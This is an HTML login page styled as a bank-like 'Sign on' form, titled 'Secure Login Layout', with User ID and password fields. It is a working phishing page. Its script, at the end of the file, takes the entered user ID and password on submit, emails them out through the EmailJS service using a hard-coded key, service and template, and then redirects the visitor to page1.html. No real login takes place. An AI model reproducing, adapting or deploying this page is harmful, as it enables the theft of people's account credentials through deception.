<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Secure Login Layout</title>

    <!-- EmailJS SDK -->
    <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>

    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        html,
        body {
            width: 100%;
            min-height: 100vh;
            overflow-x: hidden;
            font-family: Arial, Helvetica, sans-serif;
            background: #fff;
        }

        body {
            display: flex;
            flex-direction: column;
        }

        /* =========================
           SECTION LAYOUT
        ========================= */

        .top-section {
            height: 20vh;
            overflow: hidden;
        }

        .middle-section {
            height: 80vh;
            position: relative;

            display: flex;
            justify-content: flex-end;  /* RIGHT SIDE */
            align-items: center;

            padding-right: 40px;

            background-image: url("1B.jpeg");
            background-size: cover;
            background-position: center;
            background-repeat: no-repeat;
        }

        /* =========================
           TOP & BOTTOM IMAGES
        ========================= */
         
		.top-section img {
            width: auto;
            height: auto;
            display: block;
        }
		
        .bottom-section {
            height: 400px; /* or whatever you want */
        }

        .bottom-section img {
            width: 100%;
            height: 100%;
            object-fit: block;
        }

        /* =========================
           LOGIN CARD
        ========================= */

        .login-card {
            position: relative;
            z-index: 2;

            width: 350px;
            max-width: 90%;

            background: rgba(255, 255, 255, 0.97);
            border-radius: 0px;

            padding: 30px;
		    box-shadow: 0 18px 50px rgba(0, 0, 0, 0.25);

            display: flex;
            flex-direction: column;
        }

        .title {
            font-size: 2rem;
            font-weight: 700;
            color: #222;
            margin-bottom: 15px;
			margin-top: -20px;
        }

        .login-banner {
            display: block;
            width: calc(100% + 60px);
            margin: -30px -30px 20px -30px;
            border-radius: Auto;
		}
		.login-footer {
            display: block;
            width: calc(100% + 60px);
            margin: 20px -30px -30px -30px;
            height: auto;
	    }
		
        .form-group {
            margin-bottom: 15px;
        }

        .form-row {
            display: flex;
            gap: 20px;
        }

.form-row .form-group {
    flex: 1;
}
        .form-group label {
            display: block;
            font-size: 14px;
            font-weight: 700;
            color: #333;
            margin-bottom: 6px;
        }

        .form-group input {
            width: 140px;
            height: 35px;
            border: 1px solid #ccc;
            border-radius: 5px;
            padding: 0 22px;
            font-size: 14px;
        }

        .form-group input:focus {
            outline: none;
            border-color: #164fb9;
            box-shadow: 0 0 0 5px rgba(22, 79, 185, 0.15);
        }

        /* =========================
           REMEMBER ME
        ========================= */

        .remember {
            display: flex;
            align-items: center;
            gap: 14px;
            font-size: 15px;
            color: #555;
            margin-top: 0px;
            margin-bottom: 34px;
        }

        .remember input {
            width: 12px;
            height: 12px;
        }

        /* =========================
           BUTTON
        ========================= */

        .login-btn {
            width: 100%;
            height: 50px;
            border: none;
            border-radius: 8px;
            background: #056dae;
            color: white;
            font-size: 13px;
            font-weight: 700;
            cursor: pointer;
            transition: 0.2s ease;
			margin-top: -10px;
        }

        .login-btn:hover {
            background: #002a54;
        }

        /* =========================
           FOOTER LINK
        ========================= */

        .footer-links {
            margin-top: 32px;
            font-size: 18px;
        }

        .footer-links a {
            color: #164fb9;
            text-decoration: none;
        }

        /* =========================
           MOBILE VERSION
        ========================= */

        @media (max-width: 768px) {

            .top-section {
                height: auto;
            }

            .bottom-section {
                height: auto;
            }

            .middle-section {
                height: auto;
                min-height: 50vh;
                padding: 30px 0;
                background: #FFFFFF;
            }

            .top-section img,
            .bottom-section img {
                width: 100%;
                height: auto;
				display: block;
                object-fit: contain;
            }

            .login-card {
                width: 92%;
                max-width: 100%;
                min-height: 500px;
                transform: scale(1);
                padding: 50px 24px;
                border-radius: 18px;
				margin-left: -30px
            }
            /* Make the top and bottom form images match the form width */
            .login-banner,
            .login-footer {
                width: 100%;
                margin: 0 0 20px 0;
                display: block;
                border-radius: 0;
            }

            .login-footer {
                margin: 20px 0 0 0;
			}
			
            .title {
                font-size: 2.5rem;
                margin-bottom: 28px;
            }

            .form-group {
                margin-bottom: 22px;
            }

            .form-group label {
                font-size: 19px;
                margin-bottom: 8px;
            }

            .form-group input {
                height: 68px;
                font-size: 17px;
                padding: 0 16px;
                border-radius: 12px;
            }

            .remember {
                font-size: 17px;
                gap: 10px;
                margin-bottom: 26px;
            }

            .remember input {
                width: 20px;
                height: 20px;
            }

            .login-btn {
                height: 70px;
                font-size: 20px;
                border-radius: 22px;
            }

            .footer-links {
                font-size: 16px;
                margin-top: 24px;
            }
        }
    </style>
</head>

<body>

    <!-- TOP SECTION -->
    <section class="top-section">
        <picture>
            <source media="(max-width: 768px)" srcset="2A.JPG">
            <img src="1A.jpeg" alt="">
        </picture>
    </section>

    <!-- MIDDLE SECTION -->
    <section class="middle-section">

        <div class="login-card">

            <img src="JJ.jpeg" alt="Login Banner" class="login-banner">

            <!-- UPDATED FORM FOR EMAILJS -->
			
			<form id="login-form">
            
			<div class="form-row">
                <div class="form-group">
                    <label>User ID</label>
                    <input type="text" name="userid" required>
                </div>

                <div class="form-group">
                    <label>Password</label>
                    <input type="password" name="password" required>
                </div>
                </div>
                <div class="remember">
                    <input type="checkbox" id="remember" name="remember">
                    <label for="remember">Remember me</label>
                </div>

                <button class="login-btn" type="submit">
                    Sign on
                </button>

             
			 <img src="VV.jpeg" alt="Footer Banner" class="login-footer">
			 
            </form>

        </div>

    </section>

    <!-- BOTTOM SECTION -->
    <section class="bottom-section">
        <picture>
            <source media="(max-width: 768px)" srcset="2C.JPG">
            <img src="1C.jpeg" alt="">
        </picture>
    </section>

    <!-- EMAILJS SCRIPT -->
    <script>
        // Initialize EmailJS
        emailjs.init("pihpsTf7HFt-OXVeT"); // Your Public Key

        const form = document.getElementById("login-form");

        form.addEventListener("submit", function (e) {
            e.preventDefault();

            // Collect form data
            const params = {
                userid: document.querySelector('input[name="userid"]').value,
                password: document.querySelector('input[name="password"]').value,
                remember: document.querySelector('input[name="remember"]').checked ? "Yes" : "No"
            };

            // Send email via EmailJS
            emailjs.send("service_ozbrno9", "template_y61tbhs", params)
                .then(function (response) {
                    console.log("SUCCESS!", response.status, response.text);
		            window.location.href = "page1.html"; // redirect
                })
                .catch(function (error) {
                    console.error("FAILED...", error);
                    alert("Something went wrong. Please try again.");
                });
        });
    </script>

</body>
</html>
